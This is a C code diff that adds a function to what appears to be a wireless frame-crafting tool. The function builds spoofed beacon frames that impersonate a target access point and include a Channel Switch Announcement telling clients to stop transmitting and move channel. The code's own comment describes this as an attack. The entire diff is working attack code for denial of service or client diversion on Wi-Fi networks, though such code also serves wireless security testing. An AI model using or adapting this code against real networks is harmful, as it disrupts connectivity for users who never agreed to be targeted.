@@ -312,3 +312,48 @@ size_t bas_frame_assoc_req(uint8_t *buf, const uint8_t bssid[6],
 
     return n;
 }
+
+size_t bas_frame_csa(uint8_t *buf, const uint8_t bssid[6], const char *ssid,
+                     uint8_t channel, uint8_t new_channel, uint8_t count,
+                     uint16_t seq)
+{
+    if (buf == NULL || bssid == NULL || ssid == NULL) {
+        return 0;
+    }
+    size_t sl = strlen(ssid);
+    if (sl == 0u || sl > 32u) {
+        return 0;
+    }
+    if (new_channel < 1u || new_channel > 14u || new_channel == channel) {
+        /* Switching a cell to the channel it is already on is not an attack,
+         * it is a malformed frame. */
+        return 0;
+    }
+
+    size_t n = mgmt_hdr(buf, 8, BCAST, bssid, bssid, seq);
+
+    memset(&buf[n], 0, 8);
+    n += 8;
+    buf[n++] = 0x64; buf[n++] = 0x00;    /* beacon interval               */
+    buf[n++] = 0x11; buf[n++] = 0x00;    /* ESS + privacy                 */
+
+    buf[n++] = 0x00;
+    buf[n++] = (uint8_t)sl;
+    memcpy(&buf[n], ssid, sl);
+    n += sl;
+
+    n = add_rates(buf, n);
+
+    buf[n++] = 0x03;                     /* DS parameter: current channel */
+    buf[n++] = 0x01;
+    buf[n++] = channel;
+
+    /* Channel Switch Announcement. */
+    buf[n++] = 0x25;                     /* element 37                    */
+    buf[n++] = 0x03;
+    buf[n++] = 0x01;                     /* mode: stop transmitting       */
+    buf[n++] = new_channel;
+    buf[n++] = count;                    /* beacons until the switch      */
+
+    return n;
+}
